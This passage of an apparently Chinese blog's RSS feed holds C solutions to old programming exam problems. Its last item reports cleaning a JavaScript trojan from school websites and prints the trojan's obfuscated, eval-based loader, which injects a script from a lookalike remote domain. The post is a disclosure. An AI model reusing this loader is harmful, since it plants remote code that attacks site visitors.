scanf(&amp;#34;%c&amp;#34;,&amp;amp;x); pos = search_pos(str,x); if(pos == 0) printf(&amp;#34;此字符不存在于字符串中\n&amp;#34;); else printf(&amp;#34;查找成功此字符在字符串的第%d个位置\n&amp;#34;,pos); } 另一种思路：先输入字符再输入字符串，可以完美解决 #include int main(){ char str[100]; printf(&amp;#34;输入字符\n&amp;#34;); char c = getchar(); //char x = getchar(); //printf(&amp;#34;%d&amp;#34;,x); printf(&amp;#34;输入字符串\n&amp;#34;); scanf(&amp;#34;%s&amp;#34;,str); printf(&amp;#34;%d&amp;#34;,str[0]); } 补充： #include int main(){ // 同时使用scanf输入两个字符串可以 /** char str[100], a[100]; printf(&amp;#34;输入字符串\n&amp;#34;); scanf(&amp;#34;%s&amp;#34;,str); printf(&amp;#34;输入字符串\n&amp;#34;); scanf(&amp;#34;%s&amp;#34;,a); **/ //先输入字符（getchar、scanf均可）后输入字符串可以 /** char str[100], a; printf(&amp;#34;输入字符\n&amp;#34;); scanf(&amp;#34;%c&amp;#34;,&amp;amp;a); printf(&amp;#34;输入字符串\n&amp;#34;); scanf(&amp;#34;%s&amp;#34;,str); **/ //先输入字符串（scanf输入），后输入字符不可以但是使用gets()可以 char str[100], a; printf(&amp;#34;输入字符串\n&amp;#34;); //scanf(&amp;#34;%s&amp;#34;,str); gets(str); printf(&amp;#34;输入字符\n&amp;#34;); scanf(&amp;#34;%c&amp;#34;,&amp;amp;a); //总结：不能使用scanf先输入字符串再输入字符，其他情况均可  } </description>
    </item>
    
    <item>
      <title>【2016-c-三-1】求1&#43;2×3&#43;4x5x6&#43;7x8x9x10&#43;……至n项</title>
      <link>/post/2016-c-%E4%B8%89-1/</link>
      <pubDate>Thu, 06 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2016-c-%E4%B8%89-1/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; int main() { int i,j,l;//中间变量  int n;//项数  int s=0;//总和  printf(&amp;#34;请输入项数n的值\n&amp;#34;); scanf(&amp;#34;%d&amp;#34;,&amp;amp;n); for(i=1;i&amp;lt;=n;i++) { int k =1;//每次开始的值  int m =1;//每次累乘和  for(j=1;j&amp;lt;i;j++) k=k+j;//求出每项开始值  for(l=k;l&amp;lt;k+i;l++) m=m*l;//每项累乘  s=s+m; } printf(&amp;#34;前%d项和为：%d\n&amp;#34;,n,s); } </description>
    </item>
    
    <item>
      <title>【2016-c-三-2】歌咏比赛，去掉最高分最低分，输出前三名</title>
      <link>/post/2016-c-%E4%B8%89-2/</link>
      <pubDate>Thu, 06 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2016-c-%E4%B8%89-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; //定义学生结构体，包含学生编号和成绩两部分 typedef struct Competitor { double grade; int number; } Competitor; double get_grade(int n) { int sum = 0; int min,max;//定义总分，最高分，最低分  int s;//老师打分  int i;//循环控制变量  double average;//定义平均分  printf(&amp;#34;现在对编号为%d的选手打分\n&amp;#34;,n); for(i=0;i&amp;lt;8;i++) { printf(&amp;#34;请第%d位老师打分:\n&amp;#34;,i+1); scanf(&amp;#34;%d&amp;#34;,&amp;amp;s); //第一个老师打的分赋值  if(i==0) { max=s; min=s; } //找最高分最低分  if(max&amp;lt;s) max=s; if(min&amp;gt;s) min=s; sum = sum + s; } sum = sum - min - max;//去掉最高分、去掉最低分  average = sum/6.0; printf(&amp;#34;编号为%d的选手平均分为%f\n&amp;#34;,n,average); return average; } int main() { Competitor c[5];//20位太多了，5位测试  int i; int j; for(i=0;i&amp;lt;5;i++) { int n; printf(&amp;#34;请输入学生编号：&amp;#34;); scanf(&amp;#34;%d&amp;#34;,&amp;amp;n); c[i].</description>
    </item>
    
    <item>
      <title>1998-c-二</title>
      <link>/post/1998-c-%E4%BA%8C/</link>
      <pubDate>Wed, 05 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1998-c-%E4%BA%8C/</guid>
      <description>算法思想: 输入一个数x，将其对n取余(n从2开始)，如果余数为零，m=m/n,重复操作。如果余数不为零，n++,直到找到能够被其整除的数。
非递归算法
#include &amp;lt;stdio.h&amp;gt;int main() { int n, i, c;//需要分解的自然数  scanf(&amp;#34;%d&amp;#34;, &amp;amp;n); i = 2; c = n; printf(&amp;#34;%d=&amp;#34;, n); while(n != 1) { if(n%i == 0) { printf(&amp;#34;%s%d&amp;#34;, c == n ? &amp;#34;&amp;#34; : &amp;#34;*&amp;#34;, i); n /= i; } else ++i; } } 递归算法实现
#include &amp;lt;stdio.h&amp;gt; void num_break(int c,int n,int i) { if(n!=1)//n==1,证明分解完毕 	{ if(n%i==0) { printf(&amp;#34;%s%d&amp;#34;, c == n ? &amp;#34;&amp;#34; : &amp;#34;*&amp;#34;, i); n/=i; num_break(c,n,i); }	else num_break(c,n,++i); } } int main() { num_break(140,140,2); } </description>
    </item>
    
    <item>
      <title>1998-c-四</title>
      <link>/post/1998-c-%E5%9B%9B/</link>
      <pubDate>Wed, 05 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1998-c-%E5%9B%9B/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;//逆置指针字符串 void invert(char *str,int len) { char * p1 = str; char * p2 = str + len - 1; while(p1 &amp;lt; p2) { char c = *p1; *p1 = *p2; *p2 = c; ++p1; --p2; } } int main() { char str1[] = &amp;#34;5689&amp;#34;;//字符串1 	char str2[] = &amp;#34;356&amp;#34;;//字符串2  int len1 = strlen(str1);//取字符串1的长度 	int len2 = strlen(str2);//取字符串2的长度  invert(str1,len1);//逆置 	invert(str2,len2); //结果字符串动态分配 	char *result; result = (char*)malloc(len1 + len2); //初始化结果字符串 	for(int k = 0; k &amp;lt; len1 + len2; k++) { result[k] = &amp;#39;0&amp;#39;; } for(int i=0;i&amp;lt;len1+len2;i++) { printf(&amp;#34;%c&amp;#34;,result[i]); } printf(&amp;#34;\n&amp;#34;); for(int i=0; i&amp;lt;len1; i++) { for(int j=0; j&amp;lt;len2; j++) { int pos = i + j;//待写入位置 	int tmp = (str1[i] - &amp;#39;0&amp;#39;) * (str2[j] - &amp;#39;0&amp;#39;) + (result[pos] - &amp;#39;0&amp;#39;); result[pos] = tmp % 10 + &amp;#39;0&amp;#39;; //将余数写入对应位置 	//产生的进位 	int carry = tmp / 10; //当进位大于0,则更新下一位，一直更新，直到进位为0 	while(carry &amp;gt; 0) { //下一个位置的数真值加上进位得到tmp 	tmp = result[pos + 1] - &amp;#39;0&amp;#39; + carry; //下一个位置等于tmp对10求余数 	result[pos + 1] = tmp % 10 + &amp;#39;0&amp;#39;; //计算进位 	carry = tmp / 10; //移动位置 	pos++; } for(int i=0; i&amp;lt;len1+len2;i++) { printf(&amp;#34;%c&amp;#34;,result[i]); }	printf(&amp;#34;\n&amp;#34;); } } /** char *str1= &amp;#34;5689&amp;#34;（静态存储区） char str[] = &amp;#34;5689&amp;#34;(栈区) (char*)malloc(len1 + len2)(堆区); **/ invert(result,len1+len2); for(int i=0; i&amp;lt;len1+len2;i++) { printf(&amp;#34;%c&amp;#34;,result[i]); }	return 0; } </description>
    </item>
    
    <item>
      <title>1997-c-二</title>
      <link>/post/1997-c-%E4%BA%8C/</link>
      <pubDate>Tue, 04 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1997-c-%E4%BA%8C/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;//向量 typedef struct Vector { int x; int y; }Vector; //坐标点 typedef struct Point { int x; int y; }Point; //判断两向量是否共线，不共线即可构成三角形 int triangle(Vector v[]) { if(v[0].x*v[1].y == v[1].x*v[0].y) return 0;//共线、不能构成三角形  else return 1; } //将三点坐标转换为两个向量的坐标 void change(Point p[],Vector v[]) { v[0].x = p[0].x-p[1].x; v[0].y = p[0].y-p[1].y; v[1].x = p[0].x-p[2].x; v[1].y = p[0].y-p[2].y; } int main() { int n;//坐标点总数  int i,j,k;//循环变量  Point m[3];//三个点  Vector l[2];//两个向量  printf(&amp;#34;请输入坐标点个数：\n&amp;#34;);//输入坐标点个数  scanf(&amp;#34;%d&amp;#34;,&amp;amp;n); Point *p = (Point*)malloc(sizeof(Point)*n);//分配点存储空间  for(i=0;i&amp;lt;n;i++) { printf(&amp;#34;请输入第%d个坐标：\n&amp;#34;,i); scanf(&amp;#34;%d,%d&amp;#34;,&amp;amp;p[i].</description>
    </item>
    
    <item>
      <title>1997-d-六</title>
      <link>/post/1997-d-%E5%85%AD/</link>
      <pubDate>Tue, 04 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1997-d-%E5%85%AD/</guid>
      <description>// 先序遍历树中每个节点 int visit( int T[],int n,int id) { if(id &amp;gt; n) return 0; printf(&amp;#34;%d&amp;#34;,id); visit(T,n,id*2); visit(T,n,id*2+1); } //打印全部祖先结点 int print_ancestor(int T[],int n) { int parent = 0; parent = n/2; while(parent &amp;gt;0) { printf(&amp;#34;%d&amp;#34;,parent); parent = parent/2; } } </description>
    </item>
    
    <item>
      <title>1998-c-一</title>
      <link>/post/1998-c-%E4%B8%80/</link>
      <pubDate>Tue, 04 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1998-c-%E4%B8%80/</guid>
      <description>void merge(LNode *A,LNode * B) { LNode *r = A;//用于指向新链表的链尾,A为新链表的头指针 	LNode *p = A-&amp;gt;next; LNode *q = B-&amp;gt;next; free(B); while(p-&amp;gt;next!=NULL &amp;amp;&amp;amp; q-&amp;gt;next!=NULL) { //按照从小到大顺序排列 	if(p-&amp;gt;data &amp;lt;q-&amp;gt;data) { r-&amp;gt;next=p; r=r-&amp;gt;next; p=p-&amp;gt;next; }else{ r-&amp;gt;next=q; r=r-&amp;gt;next; q=q-&amp;gt;next; } } if(p-&amp;gt;next!=NULL) r-&amp;gt;next=p; if(q-&amp;gt;next!=NULL) r-&amp;gt;next=q; } </description>
    </item>
    
    <item>
      <title>1997-d-三</title>
      <link>/post/1997-d-%E4%B8%89/</link>
      <pubDate>Mon, 03 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1997-d-%E4%B8%89/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;  //数组p中有n个数 void move (int p[],int n) { int i=0; int j=n-1; int t=p[0]; while(i&amp;lt;j) { while(i&amp;lt;j&amp;amp;&amp;amp;p[j]%2==0) j--;//从后往前找到奇数位置 	if(i&amp;lt;j) { p[i]=p[j];//将找到的奇数移到前面 	i++;//开始位置后移		} while(i&amp;lt;j&amp;amp;&amp;amp;p[i]%2==1) i++;//从前往后找到偶数位置 	if(i&amp;lt;j) { p[j]=p[i]; j--;//结束位置前移 	} } p[i]=t; } int main() { int p[] = {2,6,1,5,14,3,18,9,10,11}; for(int i=0;i&amp;lt;10;i++) printf(&amp;#34;%d\n&amp;#34;,p[i]); printf(&amp;#34;-----------\n&amp;#34;); move(p,10); for(int i=0;i&amp;lt;10;i++) printf(&amp;#34;%d\n&amp;#34;,p[i]); } </description>
    </item>
    
    <item>
      <title>1996-c-8</title>
      <link>/post/1996-c-8/</link>
      <pubDate>Sat, 01 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1996-c-8/</guid>
      <description>//假设有那个元素已经存在于数组a中，用尾插法建立链表 //需要改变的变量用引用型 void creatListR(LNode *&amp;amp;c,int a[],int n) { LNode *s,*r; int i; c=(LNode *)malloc(sizeof(LNode)); c-&amp;gt;next=NULL; r=c; for(i=1;i&amp;lt;=n;++i) { s=(LNode *)malloc(sizeof(LNode)); s-&amp;gt;data=a[i]; r-&amp;gt;next=s; r=r-&amp;gt;next; } r-&amp;gt;next=NULL; } </description>
    </item>
    
    <item>
      <title>1996-c-六</title>
      <link>/post/1996-c-%E5%85%AD/</link>
      <pubDate>Sat, 01 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1996-c-%E5%85%AD/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; //汉诺塔移动，递归算法  //将n个盘子从 x 借助 y 移动到 z void move (int n,char x,char y,char z){ if (n==1) printf(&amp;#34;%c--&amp;gt;%c\n&amp;#34;,x,z); else { move (n-1,x,z,y); printf(&amp;#34;%c--&amp;gt;%c\n&amp;#34;,x,z); move(n-1,y,x,z); } } int main(){ int n; printf(&amp;#34;请输入汉诺塔的层数：&amp;#34;); scanf(&amp;#34;%d&amp;#34;,&amp;amp;n); printf(&amp;#34;移动步骤如下：\n&amp;#34;); move(n,&amp;#39;X&amp;#39;,&amp;#39;Y&amp;#39;,&amp;#39;Z&amp;#39;); return 0; } </description>
    </item>
    
    <item>
      <title>1997-c-三</title>
      <link>/post/1997-c-%E4%B8%89/</link>
      <pubDate>Sat, 01 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1997-c-%E4%B8%89/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;//不能使用数组，但是可以用malloc生成一串连续的存储单元  typedef struct StuInfo { int grades; int stu_id; }StuInfo; int main() { int N;//输入的学生人数  StuInfo *buffer = NULL;//指向连续的存储空间  int i = 0; int sum = 0; int averge = 0; scanf(&amp;#34;%d&amp;#34;, &amp;amp;N); printf(&amp;#34;%d\n&amp;#34;, N); buffer =(StuInfo *)malloc(sizeof(StuInfo) * N); //输入学生信息，并统计学生成绩的总和  for (i = 0 ; i &amp;lt; N; i++) { printf(&amp;#34;Enter student information inluding grades and stu_id.\n&amp;#34;); scanf(&amp;#34;%d%d&amp;#34;, &amp;amp;((buffer + i)-&amp;gt;grades), &amp;amp;((buffer + i)-&amp;gt;stu_id)); sum += (buffer + i)-&amp;gt;grades; } averge = sum / N;//计算学生的平均值  //求大于平均分的学生的成绩，并输入成绩和学号  for (i = 0; i &amp;lt; N; i++) { if ((buffer + i)-&amp;gt;grades &amp;gt;= averge) { printf(&amp;#34;%d %d\n&amp;#34;, (buffer + i)-&amp;gt;grades, (buffer + i)-&amp;gt;stu_id); } } } </description>
    </item>
    
    <item>
      <title>1997-c-四</title>
      <link>/post/1997-c-%E5%9B%9B/</link>
      <pubDate>Sat, 01 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1997-c-%E5%9B%9B/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;/* **数组中有N个元素，要移动K个位置，那么数组的大小最小是N+K **宏定义N与K */ #define N 3 //存储的数据 #define K 2 //移动的位置  #define MAXSIZE (N + K)  void EnterIntegers(int *p); void Move_k_Position(int *p); void ShowArray(int *p); int main() { int A[MAXSIZE]; //输入N个整数  EnterIntegers(A); //移动K个位置  Move_k_Position(A); //显示数组元素  ShowArray(A); } //输入N个整数 void EnterIntegers(int *p) { int i = 0; printf(&amp;#34;Enter N integers.\n&amp;#34;); for (i = 0; i &amp;lt; N; i++) { scanf(&amp;#34;%d&amp;#34;, p + i); printf(&amp;#34;%d\n&amp;#34;, *(p + i)); } } //移动K个位置 void Move_k_Position(int *p) { int i = 0; p = p + N -1; //从头部开始，每个元素都往后移动K个位置  for (i = N - 1 ; i &amp;gt;= 0; i--) { *(p + K) = *p; *p = -1;//移动后将数据域清零  p--; } //输出数组中的数据域中的内容  } //显示数组元素 //空出来的位置以-1标记 void ShowArray(int *p) { int i = 0; for (i = 0; i &amp;lt; N + K; i++) { printf(&amp;#34;%d\n&amp;#34;, p[i]); } } </description>
    </item>
    
    <item>
      <title>1996-d-五</title>
      <link>/post/1996-d-%E4%BA%94/</link>
      <pubDate>Sat, 24 Sep 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1996-d-%E4%BA%94/</guid>
      <description>/** 交换二叉树每个结点左右孩子节点（非递归算法） 算法的基本思想： 1.判断根节点地址是否为空，为空返回 2.将结点放入顺序队列中，每次出队一个结点 3.交换该节点的左右孩子结点,并将孩子结点插入队尾 **/ void change(BTNode *p){ if(p==null) retrun;//判断树是否为空 	BTNode *queue[maxSize];//定义一个队列用于存储结点 	BTNode *out,*temp;//out为出队指针、temp用于交换左右子树 	int front=0;//队列头尾 	int rear=0; queue[front]=p;//初始化队列 	queue[rear]=p; //循环交换左右子树 	while(rear&amp;lt;front) { out=queue[front++]; //出队 	//交换左右子树 	temp=out-&amp;gt;lchild; out-&amp;gt;lchild=out-&amp;gt;rchild; ouot-&amp;gt;rchild=temp; //将交换完成结点插入队列 	if(out-&amp;gt;lchild!=NULL) queue[++rear]=out-&amp;gt;lchild; if(out-&amp;gt;rchild!=NULL) queue[++rear]=out-&amp;gt;rchild; } } /** 递归算法 **/ void change(BTNode *p){ if(p==NULL)return; BTNode *temp; temp=p-&amp;gt;lchild; p-&amp;gt;lchild=p-&amp;gt;rchild; p-&amp;gt;rchild=temp; change(p-&amp;gt;lchild); change(p-&amp;gt;rchild); } </description>
    </item>
    
    <item>
      <title>1996-c-二</title>
      <link>/post/1996-%E4%BA%8C/</link>
      <pubDate>Sun, 18 Sep 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1996-%E4%BA%8C/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; #define MAXSIZE 100  int main() { int reverse_string(char *string);//函数原型声明  char str[MAXSIZE];//数组最大下标  scanf(&amp;#34;%s&amp;#34;, str); printf(&amp;#34;%s\n&amp;#34;, str); reverse_string(str); } int reverse_string(char *string) { char *tail = NULL; char *head = NULL; head = string; tail = string; while(*(++tail));//调整tail指针指向字符串尾部  tail--;//在while判断时多移动一个位置  printf(&amp;#34;*head:%c\n&amp;#34;, *head); printf(&amp;#34;*tail:%c\n&amp;#34;, *tail); while ((tail &amp;gt;= head) &amp;amp;&amp;amp; (*tail== *head)) { //当前位置对称，指针往后移动  //不对称，或者尾指针小于头指针，就结束比较  tail--; head++; } //尾指针大于等于头指针，说明不是回文  //因为没有比较完字符串中的所有元素就中断了循环，存在*tail ！= *head的情况  if (tail &amp;gt;= head) { printf(&amp;#34;Not reverse string.</description>
    </item>
    
    <item>
      <title>1996-c-四</title>
      <link>/post/1994-%E5%9B%9B/</link>
      <pubDate>Sun, 18 Sep 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1994-%E5%9B%9B/</guid>
      <description>//基本思想生成一条新串，不是在原有串上进行复杂操作
int delsubStr(char* str_in,char* str_sub, char* str_out) { int start = 0; /* 记录开始比较下标 */ int count = 0; /* 记录子串个数 */ int j = 0; /* 记录子串的下标 */ int k = 0; /* 记录结果字符串的下标 */ int i; /*循环变量*/ for (i = 0; str_in[i] != &amp;#39;\0&amp;#39;; i++) { start = i; /* 临时保存比较下标 */ j = 0; /* 每次开始比较的时候，子串都从0开始,如果第一个字符相等， 那么就接着比较下一个字符，否则进入下一轮循环 */ while ((str_in[i] != &amp;#39;\0&amp;#39;)&amp;amp;&amp;amp;(str_sub[j] != &amp;#39;\0&amp;#39;)&amp;amp;&amp;amp;(str_in[i] == str_sub[j])) { i++; /* 源串后移一个位置 */ j++; /* 字串后移一个位置 */ } if (str_sub[j] !</description>
    </item>
    
    <item>
      <title>js木马</title>
      <link>/post/js%E6%9C%A8%E9%A9%AC/</link>
      <pubDate>Thu, 31 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>/post/js%E6%9C%A8%E9%A9%AC/</guid>
      <description>最近发现学校的多个站点，中了弹窗木马，费了好大劲，清完了，同时缴获php大马一枚，还不错。。。
木马代码
var str=&amp;#34;cnbtldms-vqhsd&amp;#39;!;rbqhosrqb&amp;lt;[!gsso9..vvv-fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:&amp;#34;;var length=str.length;var ba64=&amp;#34;&amp;#34;;for(i=0;i&amp;lt;length;i++){var s=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)}eval(ba64); 木马程序就不上传了，哈哈</description>
    </item>
    
  </channel>
</rss>
